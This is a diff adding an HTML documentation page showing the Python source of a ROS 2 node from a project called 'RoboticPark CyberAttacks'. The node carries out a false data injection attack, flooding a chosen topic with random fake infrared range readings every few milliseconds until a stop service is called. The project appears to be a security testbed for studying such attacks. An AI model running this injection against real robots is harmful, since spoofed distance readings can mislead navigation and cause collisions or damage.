@@ -1,0 +1,247 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="es" data-content_root="../../">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>roboticpark_cyberattacks.fdiaattack_range &mdash; documentación de RoboticPark CyberAttacks - 1.0</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=4936afed"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/translations.js?v=f85f4cfb"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Índice" href="../../genindex.html" />
+    <link rel="search" title="Búsqueda" href="../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            RoboticPark CyberAttacks
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Buscar documentos" aria-label="Buscar documentos" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../source/modules.html">roboticpark_cyberattacks</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">RoboticPark CyberAttacks</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="../index.html">Código de módulo</a></li>
+      <li class="breadcrumb-item active">roboticpark_cyberattacks.fdiaattack_range</li>
+      <li class="wy-breadcrumbs-aside">
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <h1>Código fuente para roboticpark_cyberattacks.fdiaattack_range</h1><div class="highlight"><pre>
+<span></span><span class="kn">import</span> <span class="nn">rclpy</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">rclpy.node</span> <span class="kn">import</span> <span class="n">Node</span><span class="p">,</span> <span class="n">NodeNameNonExistentError</span>
+<span class="kn">from</span> <span class="nn">roboticpark_cyberattacks.utils</span> <span class="kn">import</span> <span class="n">rslg</span><span class="p">,</span> <span class="n">printargs</span><span class="p">,</span> <span class="n">import_message_type</span>
+<span class="kn">from</span> <span class="nn">rcl_interfaces.srv</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">std_srvs.srv</span> <span class="kn">import</span> <span class="n">Trigger</span>
+<span class="kn">from</span> <span class="nn">multiprocessing</span> <span class="kn">import</span> <span class="n">Pool</span>
+<span class="kn">from</span> <span class="nn">sensor_msgs.msg</span> <span class="kn">import</span> <span class="n">Range</span>
+<span class="kn">import</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+
+<div class="viewcode-block" id="fdianode">
+<a class="viewcode-back" href="../../source/roboticpark_cyberattacks.html#roboticpark_cyberattacks.fdiaattack_range.fdianode">[documentos]</a>
+<span class="k">class</span> <span class="nc">fdianode</span><span class="p">(</span><span class="n">Node</span><span class="p">):</span>
+
+    <span class="n">topic</span><span class="o">=</span><span class="s2">&quot;&quot;</span>
+    <span class="n">rangeStart</span><span class="o">=</span><span class="mf">0.0</span>
+    <span class="n">rangeEnd</span><span class="o">=</span><span class="mf">0.0</span>
+    <span class="n">publisher</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="n">frameid</span> <span class="o">=</span> <span class="kc">None</span>
+    <span class="n">continueAttack</span> <span class="o">=</span> <span class="kc">False</span>
+
+    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="nb">super</span><span class="p">()</span><span class="o">.</span><span class="fm">__init__</span><span class="p">(</span><span class="s2">&quot;fdianode&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">declare_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_topic&#39;</span><span class="p">,</span> <span class="s2">&quot;Unset&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">declare_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_frame_id&#39;</span><span class="p">,</span> <span class="s2">&quot;Unset&quot;</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">declare_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_range_start&#39;</span><span class="p">,</span><span class="mf">0.0</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">declare_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_range_end&#39;</span><span class="p">,</span> <span class="mf">0.0</span><span class="p">)</span>
+        <span class="n">printargs</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">topic</span><span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_topic&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_parameter_value</span><span class="p">()</span><span class="o">.</span><span class="n">string_value</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">frameid</span><span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_frame_id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_parameter_value</span><span class="p">()</span><span class="o">.</span><span class="n">string_value</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">rangeStart</span><span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_range_start&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_parameter_value</span><span class="p">()</span><span class="o">.</span><span class="n">double_value</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">rangeEnd</span><span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_parameter</span><span class="p">(</span><span class="s1">&#39;fdia_range_end&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_parameter_value</span><span class="p">()</span><span class="o">.</span><span class="n">double_value</span>
+        <span class="n">rslg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">rangeStart</span><span class="si">}</span><span class="s1"> </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">rangeEnd</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+ 
+        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">topic</span> <span class="o">==</span> <span class="s1">&#39;Unset&#39;</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">rangeStart</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">rangeEnd</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">frameid</span> <span class="o">==</span> <span class="s2">&quot;Unset&quot;</span><span class="p">:</span>
+            <span class="n">rslg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="sa">f</span><span class="s1">&#39;No topic has been specified or invalid range&#39;</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+            
+        <span class="c1"># Create random injection services, triggers</span>
+        <span class="n">serviceName</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">get_name</span><span class="p">()</span><span class="si">}</span><span class="s1">/startfdiainject&#39;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">srv</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_service</span><span class="p">(</span><span class="n">Trigger</span><span class="p">,</span> <span class="n">serviceName</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">fdiainjectbridge</span><span class="p">)</span>
+
+        <span class="n">serviceName</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">get_name</span><span class="p">()</span><span class="si">}</span><span class="s1">/stopfdiainject&#39;</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">srv</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_service</span><span class="p">(</span><span class="n">Trigger</span><span class="p">,</span> <span class="n">serviceName</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">stopfdiainject</span><span class="p">)</span>
+
+        
+
+<div class="viewcode-block" id="fdianode.fdiainjectbridge">
+<a class="viewcode-back" href="../../source/roboticpark_cyberattacks.html#roboticpark_cyberattacks.fdiaattack_range.fdianode.fdiainjectbridge">[documentos]</a>
+    <span class="k">def</span> <span class="nf">fdiainjectbridge</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">):</span>
+        <span class="n">response</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Successfully launching random attack&quot;</span>
+
+        <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">fdiainject</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+
+        <span class="n">response</span><span class="o">.</span><span class="n">success</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="n">response</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">message</span>
+        <span class="k">return</span> <span class="n">response</span></div>
+
+
+
+
+<div class="viewcode-block" id="fdianode.fdiainject">
+<a class="viewcode-back" href="../../source/roboticpark_cyberattacks.html#roboticpark_cyberattacks.fdiaattack_range.fdianode.fdiainject">[documentos]</a>
+    <span class="k">def</span> <span class="nf">fdiainject</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;This function  injects messagges into one topic, decided by the user who invokes the node</span>
+<span class="sd">        However, this function is no portable. It will send always the same type of message: sensor_msgs/msg/Range</span>
+
+<span class="sd">        DataExample:</span>
+<span class="sd">            The following is an example of the message data sent by this function:</span>
+
+<span class="sd">            .. code-block:: yaml</span>
+
+<span class="sd">                ---</span>
+<span class="sd">                header:</span>
+<span class="sd">                stamp:</span>
+<span class="sd">                    sec: 0</span>
+<span class="sd">                    nanosec: 0</span>
+<span class="sd">                frame_id: range_left</span>
+<span class="sd">                radiation_type: 1</span>
+<span class="sd">                field_of_view: 1.5707999467849731</span>
+<span class="sd">                min_range: 0.0</span>
+<span class="sd">                max_range: 2.0</span>
+<span class="sd">                range: 1.470906376838684</span>
+<span class="sd">                ---</span>
+
+<span class="sd">        Returns:</span>
+<span class="sd">            None</span>
+
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">rslg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="sa">f</span><span class="s1">&#39;Launching random false data into measures&#39;</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">continueAttack</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">publisher</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">create_publisher</span><span class="p">(</span><span class="n">Range</span><span class="p">,</span><span class="bp">self</span><span class="o">.</span><span class="n">topic</span><span class="p">,</span><span class="mi">10</span><span class="p">)</span>
+
+        <span class="k">while</span> <span class="bp">self</span><span class="o">.</span><span class="n">continueAttack</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.003</span><span class="p">)</span>
+            <span class="n">msg</span> <span class="o">=</span> <span class="n">Range</span><span class="p">()</span> 
+            <span class="n">msg</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">frame_id</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">frameid</span>
+            
+            <span class="n">msg</span><span class="o">.</span><span class="n">radiation_type</span> <span class="o">=</span> <span class="n">Range</span><span class="o">.</span><span class="n">INFRARED</span>   
+            <span class="n">msg</span><span class="o">.</span><span class="n">field_of_view</span> <span class="o">=</span> <span class="mf">1.57</span>  
+            <span class="n">msg</span><span class="o">.</span><span class="n">min_range</span> <span class="o">=</span> <span class="mf">0.0</span>  
+            <span class="n">msg</span><span class="o">.</span><span class="n">max_range</span> <span class="o">=</span> <span class="mf">2.0</span>  
+            <span class="n">msg</span><span class="o">.</span><span class="n">range</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">rangeStart</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">rangeEnd</span><span class="p">)</span>
+            <span class="n">rslg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">msg</span><span class="o">.</span><span class="n">range</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+
+            <span class="bp">self</span><span class="o">.</span><span class="n">publisher</span><span class="o">.</span><span class="n">publish</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span></div>
+
+
+
+<div class="viewcode-block" id="fdianode.stopfdiainject">
+<a class="viewcode-back" href="../../source/roboticpark_cyberattacks.html#roboticpark_cyberattacks.fdiaattack_range.fdianode.stopfdiainject">[documentos]</a>
+    <span class="k">def</span> <span class="nf">stopfdiainject</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">response</span><span class="p">):</span>
+<span class="w">        </span><span class="sd">&quot;&quot;&quot;This function  marks the stop to the attack with a boolean value establishment</span>
+
+<span class="sd">        Parameters:</span>
+<span class="sd">            request: Dict, the request</span>
+<span class="sd">            response:  Dict, the response</span>
+
+<span class="sd">        &quot;&quot;&quot;</span>
+        <span class="n">response</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;Stopped&quot;</span>
+        <span class="n">rslg</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="sa">f</span><span class="s1">&#39;Stopping the fdia attack  &#39;</span><span class="p">)</span>
+
+        <span class="bp">self</span><span class="o">.</span><span class="n">continueAttack</span> <span class="o">=</span> <span class="kc">False</span>
+
+        <span class="n">response</span><span class="o">.</span><span class="n">success</span> <span class="o">=</span> <span class="kc">True</span>
+        <span class="n">response</span><span class="o">.</span><span class="n">message</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">message</span>
+        <span class="k">return</span> <span class="n">response</span></div>
+</div>
+
+
+
+
+
+<div class="viewcode-block" id="main">
+<a class="viewcode-back" href="../../source/roboticpark_cyberattacks.html#roboticpark_cyberattacks.fdiaattack_range.main">[documentos]</a>
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">rclpy</span><span class="o">.</span><span class="n">init</span><span class="p">()</span>
+    <span class="n">myfdianode</span> <span class="o">=</span> <span class="n">fdianode</span><span class="p">()</span>
+
+    <span class="n">rclpy</span><span class="o">.</span><span class="n">spin</span><span class="p">(</span><span class="n">myfdianode</span><span class="p">)</span>
+
+    <span class="n">rclpy</span><span class="o">.</span><span class="n">shutdown</span><span class="p">()</span></div>
+
+    
+</pre></div>
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Derechos de autor 2024, Raúl Álvarez de Celis.</p>
+  </div>
+
+  Compilado con <a href="https://www.sphinx-doc.org/">Sphinx</a> usando un
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">tema</a>
+    proporcionado por <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
